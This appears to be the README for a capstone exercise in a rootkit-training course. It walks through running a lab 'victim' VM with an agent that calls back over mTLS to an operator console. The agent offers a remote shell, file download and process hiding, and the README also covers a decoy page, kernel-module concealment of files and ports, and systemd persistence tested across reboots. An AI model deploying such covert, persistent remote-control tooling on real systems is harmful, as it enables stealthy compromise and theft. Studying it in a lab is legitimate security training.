# P00: Complete Rootkit

M03 proved that the integrated agent can deploy from memory, conceal selected
traces, and remain controllable.
P00 turns that integration into the complete product: a modular agent, durable
startup, reconnect and singleton handling, and the full multi-target operator
with terminal and browser interfaces.

The task is operational.
Start each side independently, observe the callback, use the real controls, and
prove persistence and removal with reboots.

## What P00 adds to M03

| M03 integration lesson     | P00 complete product                           |
| -------------------------- | ---------------------------------------------- |
| Focused lab server         | Full independent operator                      |
| One exercise agent         | Modular agent package                          |
| Ordered deployment         | Idempotent deployment and reconnect            |
| Focused command checks     | TUI, browser, PTY, files, processes, and ports |
| Concealment checks         | Procfs and `sock_diag` port filtering          |
| No complete boot lifecycle | Install, reboot, reconnect, remove, reboot     |

P00 reuses the mechanisms taught by M03; it does not introduce another hiding
model.

## System

```text
OPERATOR HOST                              TARGET VM

+----------------------+                  +----------------------+
| ./rklings serve P00  |   TLS 1.3 mTLS   | rklings_agent        |
| terminal + web UI    | <--------------> | reconnect + persist  |
+----------------------+                  +----------+-----------+
                                                    |
                                                    | mkdir controls
                                                    v
                                         +----------------------+
                                         | embedded module      |
                                         | filtering + control  |
                                         +----------------------+
```

The separation is intentional:

- `rklings run P00` builds the target, stages the agent, and boots the VM.
- The agent runs inside the VM and initiates the callback.
- `rklings serve P00` accepts callbacks and starts both operator interfaces.

An agent must tolerate an offline operator, so none of these commands silently
starts another component.

## Workspace

```text
exercises/P00-complete-rootkit
├── agent
│   ├── dispatch.go
│   ├── evasion.go
│   ├── go.mod
│   ├── go.sum
│   ├── handlers.go
│   ├── hidden.go
│   ├── main.go
│   ├── operator.go
│   ├── persistence.go
│   ├── singleton.go
│   └── transport.go
└── kernel
    ├── Kbuild
    ├── core
    │   ├── dispatch.c
    │   ├── escalation.c
    │   ├── filter.c
    │   ├── init.c
    │   ├── module.c
    │   └── target.c
    └── include
        └── rootkit.h
```

The operator is the completed host product in `product/operator`; it is not
duplicated in the learner workspace.

## Run it

Use three terminals so every boundary stays visible.

### 1. Boot the victim

```console
$ ./rklings run P00
[*] booting VM...
[+] VM ready
[+] agent staged at /rklings/rklings_agent

root@victim:~#
```

The runner does not start the agent or operator.

### 2. Start the agent inside the victim

```console
root@victim:~# setsid -f /rklings/rklings_agent \
  </dev/null >/dev/null 2>&1
root@victim:~#
```

Detaching and redirecting the standard streams keeps the VM shell usable.
The agent now retries `10.0.2.2:8443`; starting it before the server proves that
the victim initiates the callback and survives operator downtime.

### 3. Start the operator on the host

```console
$ ./rklings serve P00
```

The pending agent connects over mTLS.
The same process provides:

```text
terminal operator   current terminal
browser dashboard   http://127.0.0.1:8080
agent listener      https://0.0.0.0:8443
```

Opening the agent listener without a trusted client certificate returns the
decoy page.
A certified agent reaches the operator protocol on that same port.

## Operate it

The first agent is selected automatically.
With multiple victims, use `agents` and `use <id>` to choose the target
explicitly.

```text
victim-17def67e > info
system   victim / 7.0.0-38-generic / amd64
agent    pid=915 uid=0
stealth  module=on persistence=on

victim-17def67e > exec id
stdout
uid=0(root) gid=0(root) groups=0(root)
exit 0

victim-17def67e > download /etc/hostname
saved 7 bytes -> .rklings/downloads/victim-17def67e/etc/hostname
```

`info` issues `rklings.info` through the existing mkdir hook.
The module copies its in-memory target ledger into the caller's writable
pathname buffer and returns the response length.
It does not publish a procfs entry or maintain a second userspace ledger.
Commands issued directly in the victim shell therefore appear on the next
operator refresh as well.

Use `exec` for finite commands with separate stdout, stderr, and exit status.
Use `shell` for a persistent PTY; `Ctrl+]` returns to the operator without
closing the remote shell.
The terminal saves downloads under the selected target instead of printing
arbitrary file bytes.
The browser provides an explicit preview and save action.

Hide and unhide use the same type and value:

```text
victim-17def67e > hide file secret.txt
ok
victim-17def67e > unhide file secret.txt
ok
```

Tab completes commands and target IDs. `Ctrl+L` clears the console.
The browser controls the same live target and refreshes its overview and
inventories after commands.

## Prove persistence

Initial deployment installs and enables the self-contained agent service.
Reboot the guest while leaving the operator running:

```console
root@victim:~# reboot
```

The VM remains active.
After boot, systemd starts the agent, the agent loads its embedded module, and
the target reconnects without a manual launch.
The reboot proves the boot path; the presence of a unit file alone would not.

Remove persistence and test the opposite result:

```text
victim-17def67e > unpersist
ok
```

`unpersist` removes the durable service without terminating the current
in-memory session.
Reboot again.
The target must remain absent.

## Validate

```console
$ ./rklings validate P00
```

Validation exercises the real callback and kernel controls, checks that hidden
objects remain functional, reboots with persistence enabled, verifies the
reconnect, removes persistence, reboots again, and verifies absence.

P00 is complete when the manual runbook and automated lifecycle both pass.
